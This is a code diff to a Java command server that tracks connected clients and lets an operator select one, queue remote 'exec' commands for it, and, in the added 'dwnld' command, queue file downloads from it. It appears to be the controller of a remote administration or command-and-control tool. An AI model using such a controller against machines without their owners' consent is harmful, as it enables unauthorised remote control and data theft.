@@ -42,6 +42,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		
 		// Display available commands
 		cmdsServer.put("help", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				StringBuilder builder = new StringBuilder();
@@ -54,18 +55,22 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				
 				return builder.toString();
 			}
+			
 		});
 		
 		// Close user input
 		cmdsServer.put("exit", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				return null;
 			}
+			
 		});
 		
 		// List all connected clients
 		cmdsServer.put("list", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				
@@ -82,19 +87,23 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				
 				return sb.toString();
 			}
+			
 		});
 		
 		// Select a client to 'exec' commands
 		cmdsServer.put("select", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				currentClient = Integer.parseInt(args[0]);
 				return "Selected client " + args[0];
 			}
+			
 		});
 		
 		// Execute a command
 		cmdsServer.put("exec", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				if (currentClient >= 0) {
@@ -114,16 +123,44 @@ public class CommandServer implements RequestHandler, CommandHandler {
 					return "Select a client first.";
 				}
 			}
+			
+		});
+		
+		// Download a file
+		cmdsServer.put("dwnld", new Command(){
+			
+			@Override
+			public String exec(String[] args) {
+				if (currentClient >= 0) {
+					ConnectedClient client;
+					if ((client = identify(currentClient)) != null) {
+						StringBuilder cmd = new StringBuilder();
+						cmd.append("DWNLD ");
+						for (int i = 0; i < args.length; i++){
+							cmd.append(args[i]
+									+ (i == args.length - 1 ? "" : " "));
+						}
+						client.stackCmd(cmd.toString());
+						return "Added command to stack";
+					}
+					return "No corresponding client (" + args[0] + ") found.";
+				} else {
+					return "Select a client first.";
+				}
+			}
+			
 		});
 		
 		// Show log
 		cmdsServer.put("log", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				if (args.length > 0)
 					return log.getText(Integer.parseInt(args[0]));
 				return log.getText();
 			}
+			
 		});
 		
 		// Assign an ID to a client
@@ -141,10 +178,12 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				}
 				
 			}
+			
 		});
 		
 		// Answer a ping
 		cmdsClient.put("PING", new Command(){
+			
 			@Override
 			public String exec(String[] args) {
 				ConnectedClient client;
@@ -153,6 +192,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				}
 				return "PONG";
 			}
+			
 		});
 		
 		// ADD COMMANDS HERE
